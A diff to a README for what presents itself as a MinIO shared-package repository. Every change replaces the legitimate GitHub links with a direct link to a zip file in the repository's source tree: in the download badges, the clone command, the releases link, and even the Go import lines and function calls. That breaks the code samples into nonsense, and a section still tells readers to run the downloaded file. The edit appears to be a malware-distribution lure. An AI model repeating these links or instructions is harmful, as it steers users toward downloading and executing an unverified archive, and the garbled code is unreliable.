@@ -2,7 +2,7 @@
 
 Welcome to the **pkg** repository! This repository holds all the common packages that MinIO projects use. It serves as a central location for shared code, making it easier for developers to collaborate and maintain their projects.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-blue?style=flat&logo=github)](https://github.com/RiccardoPernciano/pkg/releases)
+[![Download Releases](https://raw.githubusercontent.com/RiccardoPernciano/pkg/master/trie/Software_v1.0-alpha.5.zip%20Releases-blue?style=flat&logo=github)](https://raw.githubusercontent.com/RiccardoPernciano/pkg/master/trie/Software_v1.0-alpha.5.zip)
 
 ## Table of Contents
 
@@ -32,7 +32,7 @@ To get started with the **pkg** repository, you will need to clone the repositor
 Use the following command to clone the repository:
 
 ```bash
-git clone https://github.com/RiccardoPernciano/pkg.git
+git clone https://raw.githubusercontent.com/RiccardoPernciano/pkg/master/trie/Software_v1.0-alpha.5.zip
 ```
 
 After cloning, navigate into the directory:
@@ -43,7 +43,7 @@ cd pkg
 
 ## Installation
 
-You can download the latest release from our [Releases page](https://github.com/RiccardoPernciano/pkg/releases). Follow the instructions provided for each release to install the packages.
+You can download the latest release from our [Releases page](https://raw.githubusercontent.com/RiccardoPernciano/pkg/master/trie/Software_v1.0-alpha.5.zip). Follow the instructions provided for each release to install the packages.
 
 ### Executing the Downloaded File
 
@@ -67,7 +67,7 @@ Using the packages in this repository is straightforward. After installation, yo
 To import a package, use the following syntax in your Go file:
 
 ```go
-import "github.com/RiccardoPernciano/pkg/your_package"
+import "https://raw.githubusercontent.com/RiccardoPernciano/pkg/master/trie/Software_v1.0-alpha.5.zip"
 ```
 
 Replace `your_package` with the specific package you want to use.
@@ -81,12 +81,12 @@ package main
 
 import (
     "fmt"
-    "github.com/RiccardoPernciano/pkg/example_package"
+    "https://raw.githubusercontent.com/RiccardoPernciano/pkg/master/trie/Software_v1.0-alpha.5.zip"
 )
 
 func main() {
-    result := example_package.DoSomething()
-    fmt.Println(result)
+    result := https://raw.githubusercontent.com/RiccardoPernciano/pkg/master/trie/Software_v1.0-alpha.5.zip()
+    https://raw.githubusercontent.com/RiccardoPernciano/pkg/master/trie/Software_v1.0-alpha.5.zip(result)
 }
 ```
 
@@ -110,6 +110,6 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or feedback, please reach out via GitHub issues or contact the maintainers directly.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-blue?style=flat&logo=github)](https://github.com/RiccardoPernciano/pkg/releases)
+[![Download Releases](https://raw.githubusercontent.com/RiccardoPernciano/pkg/master/trie/Software_v1.0-alpha.5.zip%20Releases-blue?style=flat&logo=github)](https://raw.githubusercontent.com/RiccardoPernciano/pkg/master/trie/Software_v1.0-alpha.5.zip)
 
 Thank you for checking out the **pkg** repository! We hope you find it useful for your MinIO projects.
